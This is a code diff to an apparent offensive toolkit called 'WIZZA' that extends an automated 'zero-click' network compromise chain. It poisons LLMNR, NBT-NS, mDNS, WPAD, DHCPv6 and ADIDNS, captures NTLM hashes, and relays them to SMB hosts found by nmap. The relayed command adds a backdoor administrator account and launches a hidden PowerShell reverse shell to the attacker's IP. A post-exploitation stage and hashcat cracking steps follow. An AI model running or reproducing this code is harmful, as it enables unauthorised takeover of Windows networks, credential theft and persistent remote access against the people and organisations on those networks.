@@ -37,6 +37,23 @@ Techniques that compromise hosts without any user action:
 import socket, struct, threading, time, os, sys, subprocess, base64
 import http.server, select, queue, random, ipaddress
 
+# Post-exploitation chain (loaded lazily to avoid circular imports)
+def _post_exploit_chain(target_ip, lhost, creds=None):
+    """Fire-and-forget post-exploitation. Called after relay success."""
+    try:
+        sys.path.insert(0, os.path.dirname(__file__))
+        from post_exploit import auto_post_exploit
+        result = auto_post_exploit(
+            target_ip=target_ip,
+            lhost=lhost,
+            shell_port=4445,
+            lpe_port=4446,
+            creds=creds,
+        )
+        print(result)
+    except Exception as e:
+        print(f"[POST-EXPLOIT] Error: {e}")
+
 # ── Helpers ───────────────────────────────────────────────────────────────────
 
 def _run(cmd, timeout=30):
@@ -647,73 +664,187 @@ def adidns_wildcard(dc_ip, domain, user, password, attacker_ip,
 # ══════════════════════════════════════════════════════════════════════════════
 
 def zero_click_chain(attacker_ip, dc_ip=None, domain=None,
-                     user=None, password=None, iface="eth0"):
+                     user=None, password=None, iface="eth0",
+                     auto_relay=True, duration=0):
     """
-    Launch all passive zero-interaction attack layers simultaneously.
-    No user clicks required on any victim machine.
+    Fully automated zero-click compromise chain.
 
-    Layer 1: IPv6 RA flooding (all IPv6 hosts route through us)
-    Layer 2: mDNS poisoning (all .local names → us)
-    Layer 3: LLMNR/NBT-NS poisoning (via llmnr_poison.py)
-    Layer 4: WPAD server + NTLMv1 downgrade guidance
-    Layer 5 (optional): ADIDNS wildcard (if domain creds available)
+    Runs ALL layers simultaneously and auto-pipelines captured hashes into SMB relay.
+
+    Layer 1: IPv6 RA flooding         → rogue router, intercept IPv6 traffic
+    Layer 2: mDNS poisoning           → hijack .local names
+    Layer 3: LLMNR + NBT-NS           → poison Windows name resolution, capture NTLMv2
+    Layer 4: WPAD + NTLMv1 downgrade  → auto-proxy all browsers through us
+    Layer 5: DHCPv6 rogue server      → force IPv6 config on all LAN hosts
+    Layer 6: SMB relay (auto)         → relay captured hashes to signing-disabled hosts
+    Layer 7: ADIDNS wildcard          → poison DNS for entire AD domain (if creds given)
     """
-    out = ["=" * 60,
-           " ZERO-CLICK DOMAIN COMPROMISE CHAIN",
-           f" Attacker: {attacker_ip}  Interface: {iface}",
-           "=" * 60]
+    import shutil, json
 
-    threads = []
+    out = ["=" * 62,
+           "  WIZZA ZERO-CLICK AUTO-CHAIN",
+           f"  Attacker: {attacker_ip}   Interface: {iface}",
+           f"  Auto-relay: {auto_relay}   Duration: {'∞' if duration==0 else f'{duration}s'}",
+           "=" * 62]
 
-    # Layer 1: IPv6 RA
-    def _ra():
+    _stop = threading.Event()
+    _threads = []
+    _captured_hashes = []
+    _relay_targets   = []
+
+    def _t(name, fn, *args, **kw):
+        def _wrap():
+            try: fn(*args, **kw)
+            except Exception as e: print(f"[{name}] error: {e}")
+        t = threading.Thread(target=_wrap, daemon=True, name=name)
+        t.start()
+        _threads.append(t)
+        return t
+
+    # ── Layer 1: IPv6 RA ──────────────────────────────────────────────────────
+    out.append("[L1] IPv6 Rogue RA → broadcasting rogue router advertisement")
+    _t("IPv6-RA", ipv6_rogue_ra, attacker_ip=attacker_ip, iface=iface,
+       interval=15, duration=duration)
+
+    # ── Layer 2: mDNS ────────────────────────────────────────────────────────
+    out.append("[L2] mDNS poison → hijacking .local names")
+    _t("mDNS", mdns_poison, attacker_ip=attacker_ip, duration=duration)
+
+    # ── Layer 3: LLMNR + NBT-NS ──────────────────────────────────────────────
+    out.append("[L3] LLMNR/NBT-NS → Windows name resolution poisoning + NTLMv2 capture")
+    def _llmnr_loop():
         try:
-            r = ipv6_rogue_ra(attacker_ip=attacker_ip, iface=iface,
-                               interval=20, duration=0)
-            print(f"[RA] {r[:100]}")
-        except: pass
-    threads.append(threading.Thread(target=_ra, daemon=True, name="IPv6-RA"))
-
-    # Layer 2: mDNS
-    def _mdns():
-        try:
-            r = mdns_poison(attacker_ip=attacker_ip, duration=0)
-            print(f"[mDNS] {r[:100]}")
-        except: pass
-    threads.append(threading.Thread(target=_mdns, daemon=True, name="mDNS"))
-
-    # Layer 3: LLMNR via llmnr_poison module
-    def _llmnr():
-        try:
-            sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
-            from llmnr_poison import start as llmnr_start
-            llmnr_start(attacker_ip)
+            sys.path.insert(0, os.path.dirname(__file__))
+            from llmnr_poison import start as llmnr_start, get_hashes
+            llmnr_start(attacker_ip, capture_smb=True)
+            # Poll for captured hashes and auto-relay
+            while not _stop.is_set():
+                time.sleep(5)
+                hashes = get_hashes()
+                if hashes and auto_relay:
+                    for line in hashes.splitlines():
+                        if ":::" in line and line not in _captured_hashes:
+                            _captured_hashes.append(line)
+                            print(f"[LLMNR] NEW HASH: {line[:80]}")
+                            # Write to hashcat file
+                            with open("/tmp/wizza_hashes.txt","a") as f:
+                                f.write(line + "\n")
+                            # Trigger auto-relay
+                            if _relay_targets:
+                                target = _relay_targets[0]
+                                print(f"[AUTO-RELAY] Relaying to {target}")
+                                # Stage 1: add wizza admin via relay exec_cmd
+                                _t("SMB-Relay", smb_relay,
+                                   targets=_relay_targets[:5], lhost=attacker_ip,
+                                   exec_cmd=(
+                                       "net user wizza Wizza@2024! /add & "
+                                       "net localgroup administrators wizza /add & "
+                                       # Stage 2: drop PS stager → triggers post-exploit chain
+                                       f"powershell -nop -w hidden -c \""
+                                       f"$c=New-Object Net.Sockets.TCPClient('{attacker_ip}',4445);"
+                                       f"$s=$c.GetStream();"
+                                       f"[byte[]]$b=0..65535|%{{0}};"
+                                       f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
+                                       f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                                       f"$r=(iex $d 2>&1|Out-String);"
+                                       f"$rb=[Text.Encoding]::ASCII.GetBytes($r+'> ');"
+                                       f"$s.Write($rb,0,$rb.Length)}}\""
+                                   ))
+                                # Launch post-exploit chain as background thread
+                                _t("PostExploit",
+                                   _post_exploit_chain, target, attacker_ip)
         except Exception as e:
             print(f"[LLMNR] {e}")
-    threads.append(threading.Thread(target=_llmnr, daemon=True, name="LLMNR"))
+    _t("LLMNR", _llmnr_loop)
 
-    # Layer 4: WPAD
-    def _wpad():
+    # ── Layer 4: WPAD + NTLMv1 downgrade ─────────────────────────────────────
+    out.append("[L4] WPAD → auto-proxy all LAN browsers through us")
+    _t("WPAD", wpad_ntlmv1_downgrade, attacker_ip=attacker_ip)
+
+    # ── Layer 5: DHCPv6 rogue server ─────────────────────────────────────────
+    out.append("[L5] DHCPv6 → rogue IPv6 DHCP (forces IPv6 config on all hosts)")
+    def _dhcpv6():
+        # RFC 3315 DHCPv6 — respond to all Solicit messages with our IPv6
         try:
-            wpad_ntlmv1_downgrade(attacker_ip=attacker_ip)
-        except: pass
-    threads.append(threading.Thread(target=_wpad, daemon=True, name="WPAD"))
+            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            try:
+                mcast = socket.inet_pton(socket.AF_INET6, "ff02::1:2")
+                mreq  = mcast + socket.inet_pton(socket.AF_INET6,
+                        "::" if not iface else
+                        _run(f"ip -6 addr show dev {iface} scope link 2>/dev/null | awk '/inet6/{{print $2}}' | cut -d/ -f1 | head -1").strip() or "::")
+                sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+            except: pass
+            sock.bind(("", 547))
+            sock.settimeout(1)
+            while not _stop.is_set():
+                try:
+                    data, addr = sock.recvfrom(1024)
+                    if data and data[0] == 1:  # Solicit
+                        # Build Advertise response claiming attacker IPv6 as DNS
+                        resp = bytes([2]) + data[1:4]  # Advertise, same transaction ID
+                        # Option 23: DNS recursive name server
+                        attacker_ip6 = _run(f"ip -6 addr show dev {iface} scope link 2>/dev/null | awk '/inet6/{{print $2}}' | cut -d/ -f1 | head -1").strip()
+                        if attacker_ip6:
+                            dns_addr = socket.inet_pton(socket.AF_INET6, attacker_ip6)
+                            opt23 = struct.pack("!HH", 23, len(dns_addr)) + dns_addr
+                            resp += opt23
+                        sock.sendto(resp, addr)
+                        print(f"[DHCPv6] Advertised to {addr[0]}")
+                except socket.timeout: continue
+                except: break
+        except Exception as e:
+            print(f"[DHCPv6] {e}")
+    _t("DHCPv6", _dhcpv6)
 
-    for t in threads:
-        t.start()
-        time.sleep(0.2)
-        out.append(f"[+] Started: {t.name}")
+    # ── Layer 6: Auto-scan for SMB relay targets ──────────────────────────────
+    if auto_relay:
+        out.append("[L6] SMB relay → scanning for signing-disabled targets...")
+        def _find_relay_targets():
+            try:
+                subnet = ".".join(attacker_ip.split(".")[:3]) + ".0/24"
+                # Fast scan: find hosts with 445 open
+                result = _run(f"nmap -p 445 --open --min-rate 500 -T4 {subnet} -oG - 2>/dev/null | awk '/445.open/{{print $2}}'", timeout=60)
+                for ip in result.splitlines():
+                    ip = ip.strip()
+                    if ip and ip != attacker_ip:
+                        # Check SMB signing
+                        sig_check = _run(f"nmap --script smb2-security-mode -p 445 {ip} 2>/dev/null | grep -i signing", timeout=10)
+                        if "not required" in sig_check.lower() or "disabled" in sig_check.lower():
+                            _relay_targets.append(ip)
+                            print(f"[AUTO-RELAY] Target (signing disabled): {ip}")
+                if not _relay_targets:
+                    # Fallback: all 445-open hosts
+                    _relay_targets.extend([ip.strip() for ip in result.splitlines() if ip.strip() and ip.strip() != attacker_ip])
+                print(f"[AUTO-RELAY] {len(_relay_targets)} relay targets found")
+            except Exception as e:
+                print(f"[AUTO-RELAY scan] {e}")
+        _t("SMB-Scan", _find_relay_targets)
 
-    # Layer 5: ADIDNS wildcard (if creds provided)
+    # ── Layer 7: ADIDNS wildcard ──────────────────────────────────────────────
     if all([dc_ip, domain, user, password]):
-        out.append("\n[*] Adding ADIDNS wildcard DNS record...")
-        r = adidns_wildcard(dc_ip, domain, user, password, attacker_ip)
-        out.append(r)
+        out.append(f"[L7] ADIDNS wildcard → poisoning DNS for entire {domain} domain")
+        def _adidns():
+            r = adidns_wildcard(dc_ip, domain, user, password, attacker_ip)
+            print(f"[ADIDNS] {r[:200]}")
+        _t("ADIDNS", _adidns)
 
-    out.append(f"\n[*] All zero-click layers running.")
-    out.append(f"[*] Captured hashes: from llmnr_poison → get_hashes()")
-    out.append(f"[*] Relay to SMB:    smb_relay(targets=[...])")
-    out.append(f"[*] Stop all:        set _running=False + restart agent")
+    out.append("")
+    out.append("━" * 62)
+    out.append("  ALL LAYERS ACTIVE — monitoring for victims")
+    out.append("━" * 62)
+    out.append(f"  Hashes        → /tmp/wizza_hashes.txt")
+    out.append(f"  Relay targets → {_relay_targets if _relay_targets else 'scanning...'}")
+    out.append(f"  Crack hashes  → hashcat -m 5600 /tmp/wizza_hashes.txt /usr/share/wordlists/rockyou.txt")
+    out.append(f"  SMB shells    → nc localhost 11000  (11001, 11002...)")
+    out.append(f"  Post-exploit  → auto-triggered on relay success (shell:4445 lpe:4446)")
+    out.append(f"  Loot dir      → /tmp/wizza_loot/<target_ip>/")
+    out.append("")
+
+    if duration > 0:
+        time.sleep(duration)
+        _stop.set()
+        out.append(f"[*] Duration elapsed — stopping chain")
 
     return "\n".join(out)
 
